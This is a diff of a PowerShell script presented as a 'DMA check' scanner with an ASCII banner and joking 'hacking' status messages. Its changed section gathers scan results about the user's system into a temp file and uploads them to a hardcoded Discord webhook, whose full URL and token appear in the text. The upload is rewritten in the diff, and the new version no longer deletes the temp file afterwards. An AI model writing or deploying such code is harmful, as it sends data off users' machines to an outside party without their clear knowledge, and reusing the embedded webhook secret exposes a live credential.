@@ -11,7 +11,7 @@ Write-Host @'
 ██║  ██║██╔████╔██║███████║    ██████╔╝██║   ██║██████╔╝██████╔╝███████║
 ██║  ██║██║╚██╔╝██║██╔══██║    ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██║
 ██████╔╝██║ ╚═╝ ██║██║  ██║    ██████╔╝╚██████╔╝██████╔╝██████╔╝██║  ██║
-╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
+╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
 
  ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
 ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
@@ -33,7 +33,7 @@ Start-Sleep -Milliseconds 600; Write-Host "Thanks for the cookies..."
 Start-Sleep -Milliseconds 600; Write-Host "Establishing DMA uplink..."
 Start-Sleep -Milliseconds 600; Write-Host "Bypassing firewall..."
 Start-Sleep -Milliseconds 600; Write-Host "Verifying MojoJojo Tech..."
-Start-Sleep -Milliseconds 600; Write-Host "GeorgeDroid.api in the main frame..."
+Start-Sleep -Milliseconds 600; Write-Host "George.api in the main frame..."
 Start-Sleep -Milliseconds 600; Write-Host "Reapiin is ChatGPT made."
 
 # Add Clipboard Support
@@ -106,93 +106,30 @@ if (Test-Path $ubisoftPath) {
     Write-Host "Ubisoft savegames folder not found."
 }
 
+# === DISCORD WEBHOOK SECTION ===
+
 # Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
 
-# Save scan results to text file
-$txtFile = "$env:TEMP\scan_results.txt"
-$scanContent = $Z -join "`r`n"
-[System.IO.File]::WriteAllText($txtFile, $scanContent, [System.Text.Encoding]::UTF8)
+# Save results to file
+$reportFile = "$env:TEMP\scan_results.txt"
+$Z -join "`r`n" | Out-File -FilePath $reportFile -Encoding UTF8
 
-# Send to Discord webhook
-try {
-    Write-Host "Sending scan results to Discord..." -ForegroundColor Yellow
-    
-    # Use PowerShell's native multipart form method
-    Write-Host "Using PowerShell multipart form method..." -ForegroundColor Cyan
-    
-    # Create boundary
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    
-    # Create embed JSON
-    $embedJson = @{
-        embeds = @(
-            @{
-                title = "Scan Results"
-                color = 65280
-            }
-        )
-    } | ConvertTo-Json -Depth 10 -Compress
-    
-    # Read file content
-    $fileContent = [System.IO.File]::ReadAllText($txtFile, [System.Text.Encoding]::UTF8)
-    
-    # Build multipart body
-    $bodyLines = @(
-        "--$boundary",
-        'Content-Disposition: form-data; name="payload_json"',
-        'Content-Type: application/json',
-        '',
-        $embedJson,
-        "--$boundary",
-        'Content-Disposition: form-data; name="file"; filename="scan_results.txt"',
-        'Content-Type: text/plain',
-        '',
-        $fileContent,
-        "--$boundary--"
-    )
-    
-    $body = $bodyLines -join $LF
-    
-    # Send request
-    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
-    Write-Host "Successfully sent scan results with file attachment!" -ForegroundColor Green
-    
-} catch {
-    Write-Host "Multipart form failed, trying embed fallback..." -ForegroundColor Yellow
-    
-    try {
-        # Fallback: Send as embed content (truncated if needed)
-        $maxLength = 1900
-        $description = if ($scanContent.Length -gt $maxLength) {
-            $scanContent.Substring(0, $maxLength) + "`n... (truncated - full results copied to clipboard)"
-        } else {
-            $scanContent
-        }
-        
-        $payload = @{
-            embeds = @(
-                @{
-                    title = "Scan Results"
-                    description = "``````$description``````"
-                    color = 65280
-                }
-            )
-        } | ConvertTo-Json -Depth 10
-        
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-        Write-Host "Successfully sent scan results in embed!" -ForegroundColor Green
-        
-    } catch {
-        Write-Host "Failed to send to Discord webhook: $($_.Exception.Message)" -ForegroundColor Red
-    }
+# Send normal message
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{
+    content = "Scan results"
+} -ContentType 'application/x-www-form-urlencoded'
+
+# Send file as embed
+$multipartForm = @{
+    file = Get-Item $reportFile
+    payload_json = (@{
+        embeds = @(@{
+            title = "Scan Report"
+            description = "Attached is the scan results from the PowerShell script."
+            color = 16711680  # Red
+        })
+    } | ConvertTo-Json -Depth 10)
 }
 
-# Clean up temp file
-if (Test-Path $txtFile) {
-    Remove-Item $txtFile -ErrorAction SilentlyContinue
-    Write-Host "Cleaned up temporary file." -ForegroundColor Gray
-}
-
-Write-Host "`nScript execution completed." -ForegroundColor Magenta
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $multipartForm
